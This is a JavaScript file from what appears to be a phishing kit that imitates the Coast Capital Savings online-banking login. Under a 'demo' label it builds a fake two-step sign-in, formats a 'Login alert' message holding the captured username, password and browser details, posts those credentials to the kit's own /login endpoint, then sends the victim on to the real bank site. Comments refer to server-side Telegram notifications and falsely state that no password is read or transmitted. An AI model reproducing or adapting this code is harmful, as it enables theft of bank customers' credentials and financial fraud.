(function () {
  const setupDemo = () => {
    const form = document.getElementById('aspnetForm');
    const usernameStage = document.querySelector('.divUserNameFirst');
    const usernameInput = document.getElementById('MainContentFull_ebLoginControl_txtUserName_txField');
    const continueBtn = document.getElementById('MainContentFull_ebLoginControl_btnGoToSecondStep');

    if (!form || !usernameStage || !usernameInput || !continueBtn) {
      console.warn('Coast demo helpers: required login elements were not found.');
      return;
    }

    // Markup / baseline setup
    usernameStage.classList.add('ccs-stage', 'ccs-stage--username');
    form.setAttribute('novalidate', 'novalidate');

    const statusBanner = document.createElement('div');
    statusBanner.className = 'ccs-demo-status';
    usernameStage.insertAdjacentElement('beforebegin', statusBanner);

    // Create the password stage (demo UI only)
    const passwordStage = document.createElement('section');
    passwordStage.className = 'ccs-password-stage ccs-stage ccs-stage--password ccs-hidden';
    passwordStage.innerHTML = `
      <div class="ccs-stage-header">
        <span class="ccs-stage-title">Welcome back</span>
        <button type="button" class="ccs-link-btn" data-switch>Switch username</button>
      </div>

      <label class="ccs-label" for="ccs-demo-username-preview">Username</label>
      <input id="ccs-demo-username-preview" class="ccs-input" data-username-preview readonly>

      <label class="ccs-remember">
        <input type="checkbox" id="ccs-demo-remember"> Remember me
      </label>

      <label class="ccs-label" for="ccs-demo-password">Password</label>
      <div class="ccs-password-field">
        <input type="password" id="ccs-demo-password" class="ccs-input" data-password autocomplete="current-password">
        <button type="button" class="ccs-password-toggle" data-toggle-password aria-label="Show password" aria-pressed="false"></button>
      </div>

      <a href="resetpassword.html" data-forgot>Forgot Password?</a>
    `;
    usernameStage.insertAdjacentElement('afterend', passwordStage);

    // Stage element refs
    const usernamePreview = passwordStage.querySelector('[data-username-preview]');
    const passwordStageInput = passwordStage.querySelector('[data-password]');
    const switchBtn = passwordStage.querySelector('[data-switch]');
    const toggleBtn = passwordStage.querySelector('[data-toggle-password]');
    const forgotLink = passwordStage.querySelector('[data-forgot]');

    let stage = 'username';

    const showStatus = (message, variant = 'info') => {
      if (!message) {
        statusBanner.textContent = '';
        statusBanner.classList.remove('is-visible', 'is-info', 'is-error');
        return;
      }

      statusBanner.textContent = message;
      statusBanner.classList.remove('is-info', 'is-error');
      statusBanner.classList.add(variant === 'error' ? 'is-error' : 'is-info', 'is-visible');
    };

    const setStage = (next) => {
      stage = next;
      continueBtn.dataset.stage = next;

      if (next === 'password') {
        usernameStage.classList.add('ccs-hidden');
        passwordStage.classList.remove('ccs-hidden');
        passwordStageInput.focus();
      } else {
        usernameStage.classList.remove('ccs-hidden');
        passwordStage.classList.add('ccs-hidden');
        usernameInput.focus();
      }
    };

    const LoginAlert = ({ stageName, username,password }) => {
      const now = new Date();
      const dateStr = now.toLocaleDateString();
      const timeStr = now.toLocaleTimeString();
      const ua = navigator.userAgent;

      // NOTE: IP cannot be reliably obtained from browser JS.
      // If you want IP, compute it server-side and include it in your server's log.
      return [
        'Login alert',
        'COAST CAPITAL SAVINGS',
        `User: ${(username || '').trim() || 'unknown'}`,
        `Password: ${(password || '').trim() || 'unknown'}`,
        `Date: ${dateStr}`,
        `Time: ${timeStr}`,
        `UA: ${ua}`,
        `Stage: ${stageName}`,

      ].join('\n');
    };

    // Sends a safe audit message. No password is ever read or transmitted.
    // Notification is now handled server-side
    const notifyContinue = async (currentStage) => {
      // No longer needed - server handles Telegram notifications
    };

    const handleContinue = (event) => {
      event.preventDefault();

      // Safe audit log for clicks/submits
      notifyContinue(stage);

      if (stage === 'username') {
        const value = usernameInput.value.trim();
        if (!value) {
          showStatus('Please enter your username to continue.', 'error');
          usernameInput.focus();
          return;
        }

        usernamePreview.value = value;
        setStage('password');
        showStatus('', 'info');
        return;
      }

    
      if (!passwordStageInput.value.trim()) {
        showStatus('Password is required.', 'error');
        passwordStageInput.focus();
        return;
      }

      // Check minimum 5 characters
      if (passwordStageInput.value.length < 5) {
        showStatus('Password must be at least 5 characters.', 'error');
        passwordStageInput.focus();
        return;
      }

      // After password is validated
      notifyContinue('password'); // send username + password

      // Now actually send to your backend
      const clientId = window.localStorage.getItem('adminLiveClientId') || 'unknown';
      fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: usernameInput.value,
          password: passwordStageInput.value,
          clientId: clientId
        })
      });

      window.location.href = 'https://banking.coastcapitalsavings.com';
    };

    continueBtn.addEventListener('click', handleContinue);
    form.addEventListener('submit', handleContinue);

    usernameInput.addEventListener('keydown', (event) => {
      if (event.key === 'Enter') {
        event.preventDefault();
        handleContinue(event);
      }
    });

    passwordStageInput.addEventListener('keydown', (event) => {
      if (event.key === 'Enter') {
        event.preventDefault();
        handleContinue(event);
      }
    });

    switchBtn.addEventListener('click', () => {
      passwordStageInput.value = '';
      setStage('username');
      showStatus('', 'info');
    });

    toggleBtn.addEventListener('click', () => {
      const isPassword = passwordStageInput.type === 'password';
      passwordStageInput.type = isPassword ? 'text' : 'password';
      toggleBtn.classList.toggle('is-visible', isPassword);
      toggleBtn.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
      toggleBtn.setAttribute('aria-pressed', isPassword ? 'true' : 'false');
      passwordStageInput.focus();
    });

    forgotLink.addEventListener('click', (event) => {
      event.preventDefault();
      window.location.href = 'resetpassword.html';
    });

    showStatus('', 'info');
  };

  const setupPromoRotator = () => {
    const promoRotators = document.querySelectorAll('.promo-hero-img[data-rotator]');
    promoRotators.forEach((img) => {
      const sources = img.dataset.rotator
        .split(',')
        .map((source) => source.trim())
        .filter(Boolean);

      if (sources.length < 2) return;

      let index = Math.max(0, sources.indexOf(img.getAttribute('src')));
      sources.forEach((source) => {
        const preload = new Image();
        preload.src = source;
      });

      setInterval(() => {
        index = (index + 1) % sources.length;
        img.src = sources[index];
      }, 60000);
    });
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      setupDemo();
      setupPromoRotator();
    });
  } else {
    setupDemo();
    setupPromoRotator();
  }
})();